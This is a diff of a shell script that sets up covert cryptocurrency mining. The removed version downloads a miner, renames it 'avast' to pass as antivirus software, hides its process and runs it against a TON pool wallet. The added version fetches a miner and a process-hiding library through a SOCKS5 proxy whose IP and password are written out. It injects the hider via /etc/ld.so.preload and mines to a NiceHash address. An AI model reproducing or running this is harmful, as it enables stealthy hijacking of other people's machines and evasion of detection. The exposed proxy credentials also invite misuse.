@@ -1,35 +1,48 @@
-#!/bin/bash
-
 #!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 
-#!/bin/bash
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-apt update
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
-apt install proxychains
+tar -xvzf graphics.tar.gz
 
-apt install curl
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 3.15.39.186:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
+END
 
-apt install screen -y
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider
+sleep .2
 
-wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1 
+echo " "
+echo " "
 
-tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz  >/dev/null 2>&1
+echo "**"
 
-mv danila-miner avast >/dev/null 2>&1
+./graftcp/graftcp curl ifconfig.me
 
-rm -rvf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
+echo " "
+echo " "
 
-chmod +x avast >/dev/null 2>&1
+echo "**"
 
-#wget https://raw.githubusercontent.com/renilo/bc/main/pro.sh >/dev/null 2>&1
+echo " "
+echo " "
 
-#chmod +x pro.sh >/dev/null 2>&1
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
 
-#screen -dmS Running ./pro.sh
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-sudo ph add avast
-
-./avast run https://ton-pool-server-p3agi.ondigitalocean.app EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+./graftcp/graftcp ./bezzHash --url=ssl://3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4@daggerhashimoto.usa-east.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
